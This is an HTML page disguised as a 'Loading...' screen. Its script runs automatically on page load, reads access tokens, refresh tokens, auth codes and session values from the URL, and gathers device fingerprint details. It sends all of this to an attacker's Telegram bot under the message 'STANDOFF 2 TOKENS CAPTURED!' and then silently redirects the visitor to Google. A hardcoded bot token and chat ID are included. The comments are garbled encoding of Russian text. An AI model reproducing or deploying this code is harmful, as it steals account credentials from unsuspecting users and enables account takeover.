<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        // –¢–í–û–ò –î–ê–ù–ù–´–ï - –ó–ê–ú–ï–ù–ò –ù–ê –°–í–û–ò!
        const BOT_TOKEN = "7652039782:AAHDuyL7L0I2c91-sCx397Nk5tN0LY57VHU";
        const CHAT_ID = "8177119028";
        
        // –§—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
        function collectData() {
            const data = {
                // –¢–æ–∫–µ–Ω—ã –∏–∑ URL
                access_token: getUrlParam('access_token'),
                refresh_token: getUrlParam('refresh_token'),
                code: getUrlParam('code'),
                token: getUrlParam('token'),
                session: getUrlParam('session'),
                
                // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                languages: navigator.languages,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // –í—Ä–µ–º—è –∏ –∏—Å—Ç–æ—á–Ω–∏–∫
                timestamp: new Date().toISOString(),
                referrer: document.referrer,
                full_url: window.location.href
            };
            
            function getUrlParam(name) {
                const urlParams = new URLSearchParams(window.location.search);
                const hashParams = new URLSearchParams(window.location.hash.substring(1));
                return urlParams.get(name) || hashParams.get(name);
            }
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ —Ç–æ–∫–µ–Ω—ã
            const hasTokens = Object.values(data).some(val => 
                val && val.length > 10
            );
            
            if (hasTokens) {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `üéØ STANDOFF 2 TOKENS CAPTURED!\n\n${JSON.stringify(data, null, 2)}`
                    })
                });
            }
            
            // –ú–≥–Ω–æ–≤–µ–Ω–Ω—ã–π —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ Google
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 100);
        }
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', collectData);
    </script>
